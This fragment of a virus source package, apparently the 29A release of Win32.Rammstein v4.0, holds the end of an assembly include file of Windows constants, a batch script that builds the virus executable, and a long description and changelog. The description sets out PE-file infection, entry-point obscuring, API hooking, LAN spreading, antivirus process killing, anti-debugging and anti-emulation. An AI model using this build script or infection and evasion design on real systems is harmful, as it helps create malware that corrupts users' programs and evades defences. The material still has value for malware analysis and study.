 OBJID_MENU          EQU 0FFFFFFFDh
 OBJID_CLIENT        EQU 0FFFFFFFCh
 OBJID_VSCROLL       EQU 0FFFFFFFBh
 OBJID_HSCROLL       EQU 0FFFFFFFAh
 OBJID_SIZEGRIP      EQU 0FFFFFFF9h
 OBJID_CARET         EQU 0FFFFFFF8h
 OBJID_CURSOR        EQU 0FFFFFFF7h
 OBJID_ALERT         EQU 0FFFFFFF6h
 OBJID_SOUND         EQU 0FFFFFFF5h

; EVENT DEFINITION

 EVENT_MIN           EQU 00000001h
 EVENT_MAX           EQU 7FFFFFFFh

 EVENT_OBJECT_NAMECHANGE             EQU 800Ch  ; hwnd + ID + idChild is item w/ name change
 EVENT_OBJECT_DESCRIPTIONCHANGE      EQU 800Dh  ; hwnd + ID + idChild is item w/ desc change
 EVENT_OBJECT_VALUECHANGE            EQU 800Eh  ; hwnd + ID + idChild is item w/ value change
 EVENT_OBJECT_PARENTCHANGE           EQU 800Fh  ; hwnd + ID + idChild is item w/ new parent
 EVENT_OBJECT_HELPCHANGE             EQU 8010h  ; hwnd + ID + idChild is item w/ help change
 EVENT_OBJECT_DEFACTIONCHANGE        EQU 8011h  ; hwnd + ID + idChild is item w/ def action change
 EVENT_OBJECT_ACCELERATORCHANGE      EQU 8012h  ; hwnd + ID + idChild is item w/ keybd accel change

; System Sounds (idChild of system SOUND notification)

 SOUND_SYSTEM_STARTUP            EQU 1
 SOUND_SYSTEM_SHUTDOWN           EQU 2
 SOUND_SYSTEM_BEEP               EQU 3
 SOUND_SYSTEM_ERROR              EQU 4
 SOUND_SYSTEM_QUESTION           EQU 5
 SOUND_SYSTEM_WARNING            EQU 6
 SOUND_SYSTEM_INFORMATION        EQU 7
 SOUND_SYSTEM_MAXIMIZE           EQU 8
 SOUND_SYSTEM_MINIMIZE           EQU 9
 SOUND_SYSTEM_RESTOREUP          EQU 10
 SOUND_SYSTEM_RESTOREDOWN        EQU 11
 SOUND_SYSTEM_APPSTART           EQU 12
 SOUND_SYSTEM_FAULT              EQU 13
 SOUND_SYSTEM_APPEND             EQU 14
 SOUND_SYSTEM_MENUCOMMAND        EQU 15
 SOUND_SYSTEM_MENUPOPUP          EQU 16
 CSOUND_SYSTEM                   EQU 16

; System Alerts (indexChild of system ALERT notification)

 ALERT_SYSTEM_INFORMATIONAL      EQU 1       ; MB_INFORMATION
 ALERT_SYSTEM_WARNING            EQU 2       ; MB_WARNING
 ALERT_SYSTEM_ERROR              EQU 3       ; MB_ERROR
 ALERT_SYSTEM_QUERY              EQU 4       ; MB_QUESTION
 ALERT_SYSTEM_CRITICAL           EQU 5       ; HardSysErrBox
 CALERT_SYSTEM                   EQU 6

 GUI_CARETBLINKING   EQU 00000001h
 GUI_INMOVESIZE      EQU 00000002h
 GUI_INMENUMODE      EQU 00000004h
 GUI_SYSTEMMENUMODE  EQU 00000008h
 GUI_POPUPMENUMODE   EQU 00000010h

 STATE_SYSTEM_UNAVAILABLE        EQU 00000001h  ; Disabled
 STATE_SYSTEM_SELECTED           EQU 00000002h
 STATE_SYSTEM_FOCUSED            EQU 00000004h
 STATE_SYSTEM_PRESSED            EQU 00000008h
 STATE_SYSTEM_CHECKED            EQU 00000010h
 STATE_SYSTEM_MIXED              EQU 00000020h  ; 3-state checkbox or toolbar button
 STATE_SYSTEM_INDETERMINATE      EQU STATE_SYSTEM_MIXED
 STATE_SYSTEM_READONLY           EQU 00000040h
 STATE_SYSTEM_HOTTRACKED         EQU 00000080h
 STATE_SYSTEM_DEFAULT            EQU 00000100h
 STATE_SYSTEM_EXPANDED           EQU 00000200h
 STATE_SYSTEM_COLLAPSED          EQU 00000400h
 STATE_SYSTEM_BUSY               EQU 00000800h
 STATE_SYSTEM_FLOATING           EQU 00001000h  ; Children "owned" not "contained" by parent
 STATE_SYSTEM_MARQUEED           EQU 00002000h
 STATE_SYSTEM_ANIMATED           EQU 00004000h
 STATE_SYSTEM_INVISIBLE          EQU 00008000h
 STATE_SYSTEM_OFFSCREEN          EQU 00010000h
 STATE_SYSTEM_SIZEABLE           EQU 00020000h
 STATE_SYSTEM_MOVEABLE           EQU 00040000h
 STATE_SYSTEM_SELFVOICING        EQU 00080000h
 STATE_SYSTEM_FOCUSABLE          EQU 00100000h
 STATE_SYSTEM_SELECTABLE         EQU 00200000h
 STATE_SYSTEM_LINKED             EQU 00400000h
 STATE_SYSTEM_TRAVERSED          EQU 00800000h
 STATE_SYSTEM_MULTISELECTABLE    EQU 01000000h  ; Supports multiple selection
 STATE_SYSTEM_EXTSELECTABLE      EQU 02000000h  ; Supports extended selection
 STATE_SYSTEM_ALERT_LOW          EQU 04000000h  ; This information is of low priority
 STATE_SYSTEM_ALERT_MEDIUM       EQU 08000000h  ; This information is of medium priority
 STATE_SYSTEM_ALERT_HIGH         EQU 10000000h  ; This information is of high priority
 STATE_SYSTEM_REDUNDANT          EQU 20000000h  ; this child object's data is also represented by it's parent
 STATE_SYSTEM_ONLY_REDUNDANT     EQU 40000000h  ; this object has children, but they are all redundant
 STATE_SYSTEM_VALID              EQU 7FFFFFFFh

 CCHILDREN_TITLEBAR              EQU 5
 CCHILDREN_SCROLLBAR             EQU 5

 CURSOR_SHOWING                  EQU 00000001h

; Commands to pass to WinHelp()

 HELP_CONTEXT     = 0001h
 HELP_QUIT        = 0002h
 HELP_INDEX       = 0003h
 HELP_CONTENTS    = 0003h
 HELP_HELPONHELP  = 0004h
 HELP_SETINDEX    = 0005h
 HELP_SETCONTENTS = 0005h
 HELP_CONTEXTPOPUP = 0008h
 HELP_FORCEFILE   = 0009h
 HELP_KEY         = 0101h
 HELP_COMMAND     = 0102h
 HELP_PARTIALKEY  = 0105h
 HELP_MULTIKEY    = 0201h
 HELP_SETWINPOS   = 0203h
 HELP_CONTEXTMENU = 000ah
 HELP_FINDER      = 000bh
 HELP_WM_HELP     = 000ch
 HELP_SETPOPUP_POS = 000dh

 HELP_TCARD             = 8000h
 HELP_TCARD_DATA        = 0010h
 HELP_TCARD_OTHER_CALLER  = 0011h

 IDH_NO_HELP                =     28440
 IDH_MISSING_CONTEXT        =     28441
 IDH_GENERIC_HELP_BUTTON    =     28442
 IDH_OK                     =     28443
 IDH_CANCEL                 =     28444
 IDH_HELP                   =     28445

OSVERSIONINFOA          STRUCT
    dwOSVersionInfoSize DD ?
    dwMajorVersion      DD ?
    dwMinorVersion      DD ?
    dwBuildNumber       DD ?
    dwPlatformId        DD ?
    szCSDVersion        DB 128 DUP(?)
OSVERSIONINFOA          ENDS


;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥           END OF FILE            √ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

;                             wasn't it obvious ? ;-)
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[W32US_LJ.INC]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[A.BAT]ƒƒƒ
@tasm32 -m3 -ml ramm.asm
@tlink32 -Tpe -aa -c -x ramm,,,d:\langs\libs\import32.lib
@pewrsec ramm.exe
@del *.obj
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[A.BAT]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[DESC.TXT]ƒƒƒ
comment $
                         €€€€€€€€€€€€€€€€€€€€€€€€€€€
                         €€ﬂ     ﬂ€ﬂ     ﬂ€ﬂ     ﬂ€€
                         €€   €   €   €   €   €   €€
                         €€€ﬂﬂﬂ  ‹€‹      €       €€
                         €€   ﬂﬂﬂﬂ€ﬂﬂﬂﬂ   €   €   €€
                         €€       €      ‹€   €   €€
                         €€€€€€€€€€€€€€€€€€€€€€€€€€€

     ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹       ‹‹‹‹‹‹‹ ‹‹‹‹‹ ‹‹‹ ‹‹‹
     € ‹‹‹ € € ‹‹‹ € € ‹ ‹ € € ‹ ‹ € € ‹‹‹‹€ ‹€ﬂ€‹ € ‹‹‹‹€ €‹ ‹€ € ﬂ€€ €
     € ‹ ‹‹€ € ‹‹‹ € € € € € € € € € €‹‹‹‹ € €‹ ‹€ € ‹‹‹€‹ ‹€ €‹ € €‹ﬂ €
     €‹€‹‹‹€ €‹€ €‹€ €‹€ﬂ€‹€ €‹€ﬂ€‹€ €‹‹‹‹‹€  ﬂﬂﬂ  €‹‹‹‹‹€ €‹‹‹€ €‹€ﬂ€‹€

                                     v4.0

                              = Final Release =

                       (c) Lord Julus / 29A (Jul 2000)


     ===================================================================
                                DISCLAIMER

     This is the source code of a virus. Possesing, using, spreading of
     this source code, compiling and linking it, possesing, using and
     spreading of the executable form is illegal and it is forbidden.
     Should you do such a thing, the author may not be held responsible
     for any damage that occured from the use of this source code. The
     actual purpose of this source code is for educational purposes and
     as an object of study. This source code comes as is and the author
     cannot be held responsible for the existance of other modified
     variants of this code.
     ====================================================================
     History:

     09 Sep 2000 - Today I made a small improvement. When the dropper roams
                   the net onto another computer it remains in the windows
                   dir and it represents a weak point which might be noticed
                   by an av. So, now, the virus will smartly remove either
                   the dropper or the entry in the win.ini file if one of
                   them is missing. If both are there, they are left alone
                   because they will remove eachother. Added Pstores.exe to
                   the black list. Thanks to Evul for pointing me out that
                   it is a rather peculiar file and cannot be safely
                   infected.

     22 Jul 2000 - The virus has moved up to version 4.0. Today I added
                   the network infector. It comes in a separate thread.
                   For the moment looks like everything works fine. Will
                   add a timer to it so that it does not hang in huge
                   networks... Virus is above 14k now... Waiting for the
                   LZ!

     18 Jul 2000 - Fixed a bug in the section increase algorithm: if you
                   want to have a good compatibility you NEED to place the
                   viral code exactly at the end of file and NOT at the
                   end of the VirtualSize or SizeOfRawData as it appears
                   in the section header, because many files get their
                   real size calculated at load time in some way.
                   HURRAY!!! YES!! I fixed a shitty bug! If you do section
                   add you MUST check also if any directory VA follows
                   immediately the last section header so that you will
                   not overwrite it. Now almost all files work ok under
                   NT!!!! However, I don't seem to be able to make
                   outlook.exe get infected so I put it on the black list.
                   The other MsOffice executables get infected correctly
                   on both Win9x and WinNT.

     17 Jul 2000 - Have started some optimizations and proceduralizations
                   (;-)))). The virus is quickly going towards 13k so I
                   am quite anxious to implement my new LZ routine to
                   decrease it's size. I fixed a bug: WinNT NEEDS the
                   size of headers value to be aligned to file alignment.

     14 Jul 2000 - Worked heavily on the WindowsNT compatibility. In this
                   way I was able to spot 2 bugs in the infection routine,
                   one regarding RVA of the new section and one regarding
                   the situation when the imports cannot be found by the api
                   hooker. Still thinking if I should rearrange relocs also?
                   Now files are loaded under WindowsNT (NT image is correct)
                   but they cannot fully initialize. Will research some
                   more.

     03 Jun 2000 - Added an encryption layer with no key, just a rol/ror
                   routine on parity. Also added some MMX commands. Fixed
                   a few things.

     22 May 2000 - Added EPO on files that have the viral code outside the
                   code section. Basically from now on the entry point stays
                   only into the code section. The epo is not actually epo,
                   because as I started to code it I decided to make it very
                   complicated so I will include the complicated part in the
                   next release. It will be the so called LJILE32 <Lord
                   Julus' Instruction Length Engine 32>. This engine will
                   allow me to have an exact location of the opcode for each
                   instruction so we will be able to look up any call, jump
                   or conditional jump to place our code call there. So for
                   this version only a jump at the original eip.

     21 May 2000 - Fixed a bug in the api hooker... I forgot that some import
                   sections have a null pointer to names. Also added the
                   infection by last section increase for files who cannot
                   be infected otherwise. All files should be touched now.
                   Also I fixed the problem with the payload window not
                   closing after the process closed. I solved half of it
                   as some files like wordpad.exe still have this problem.

     20 May 2000 - Prizzy helped me a lot by pointing out to me that in
                   order to have the copro working ok I need to save it's
                   environment so that the data of the victim process in
                   not altered. thanx!! Also fixed the cpuid read.

     14 May 2000 - Released first beta version to be tested

     ====================================================================
     Virus Name ........... Win32.Rammstein
     Virus Version ........ 4.0
     Virus Size ........... 13346 (debug), 14520 (release)
     Virus Author ......... Lord Julus / 29A
     Release Date ......... 04 May 2000
     Virus type ........... PE infector
     Target OS ............ Win95, Win98, WinNT, Win2000
     Target Files ......... many PE file types:
                            EXE COM ACM CPL HDI OCX PCI
                            QTC SCR X32 CNV FMT OCM OLB WPC
     Append Method ........ The  virus will check wether there is enough room
                            for  it  inside the code section. If there is not
                            enough  room  the virus will be placed at end. If
                            there  is  it  will  be  inserted inside the code
                            section  at  a  random  offset while the original
                            code will be saved at end. The placing at the end
                            has  also  two  variants.  If the last section is
                            Resources  or Relocations the virus will insert a
                            new section before the last section and place the
                            data  there,  also rearranging the last section's
                            RVAs.  If  the  last section is another section a
                            new  section  will  be placed at end. The name of
                            the new section is a common section name which is
                            choosed  based  on  the existing names so that it
                            does  not  repeat.  If the virus is placed at the
                            end just a small EPO code is used so that the eip
                            stays inside the code section.
                            A  special situation occurs if there is no enough
                            space  to  add  a new section header, for example
                            when  the  code section starts at RVA 200 (end of
                            headers).   In  this  situation  the  virus  will
                            increase the last section in order to append.
     Infect Methods ....... -Direct  file  attacks:  the  virus  will  attack
                            specific  files  in  the windows directory, files
                            which are most used by people
                            -Directory   scan:   all  files  in  the  current
                            directory will be infected, as well as 3 files in
                            the   system  directory  and  3  in  the  windows
                            directory
                            -Api  hooking  (per-process residency): the virus
                            hooks  a  few  api calls and infects files as the
                            victim  uses  the  apis
                            -Intranet  spreading:  the virus spreads into the
                            LAN using only windows apis
     Features ............. Multiple  threads:  the  virus  launches  a  main
                            thread.  While  this thread executes, in the same
                            time,  the original thread returns to host, so no
                            slowing  down  appears.  The  main  viral  thread
                            launches  other  6  threads  and  monitors  their
                            execution.  If  one of the threads is not able to
                            finish  the  system  is  hanged  because it means
                            somebody tryied to patch some of the thread code.
                            Heavy  anti-debugging:  i tried to use almost all
                            the  anti-debug  and  anti-emulation stuff that I
                            know
                            FPU: uses fpu instructions
                            Crc32 search: uses crc32 to avoid waste of space
                            Memory  roaming:  allocates  virtual  memory  and
                            jumps in it
                            Interlaced  code:  this  means  that some threads
                            share  the  same  piece  of code and the virus is
                            careful   to  let  only  one  in  the  same  time
                            otherwise we get some of the variables distroyed.
                            Preety hard to be emulated by avs.
                            Also features semaphores, timers
                            Marks infection using the Pythagoreic numbers.
                            SEH: the virus creates 9 SEH handlers, for each
                            thread and for the main thread.
(*)  Polymorphic .......... Yes (2 engines: LJMLPE32, LJFPE32)
(*)  Metamorphic .......... Yes (mild custom metamorphic engine)
     Encrypted ............ Yes
     Safety ............... Yes (avoids infecting many files)
     Kill AV Processes .... Yes
     Payload .............. On  14th  every  even  month the infected process
                            will  launch  a  thread  that will display random
                            windows  with  some  of  the  Rammstein's lyrics.
                            Pretty  annoying...  Probably  this  is the first
                            virus  that  actually  creates  real  windows and
                            processes  their  messages. The windows shut down
                            as the victim process closes.


     (*) Feature not included in this version.

     Debug notes: please note that this source code features many ways of
     debugging. You may turn on and off most of the virus's features by
     turning some variables to TRUE or FALSE.
     ====================================================================

        $
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[DESC.TXT]ƒƒƒ
